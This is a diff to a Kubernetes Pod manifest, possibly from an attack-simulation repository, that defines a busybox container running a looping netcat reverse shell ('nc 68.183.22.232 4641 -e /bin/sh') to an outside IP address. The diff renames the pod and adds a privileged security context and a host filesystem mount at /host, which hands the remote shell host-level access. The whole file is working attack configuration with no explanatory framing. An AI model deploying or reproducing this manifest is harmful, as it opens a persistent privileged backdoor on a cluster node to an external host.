@@ -1,14 +1,19 @@
 apiVersion: v1
 kind: Pod
 metadata:
-  name: nc-reverse-shell-pod
+  name: Cye-RS-pod
   labels:
     app: nc
 spec:
   containers:
-  - name: nc-reverse-shell
+  - name: Cye-reverse-shell
     image: busybox
     args: ["sh", "-c", "while true; do nc 68.183.22.232 4641 -e /bin/sh; sleep 10; done"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - name: hostvolume
+      mountPath: /host
   volumes:
   - name: hostvolume
     hostPath:
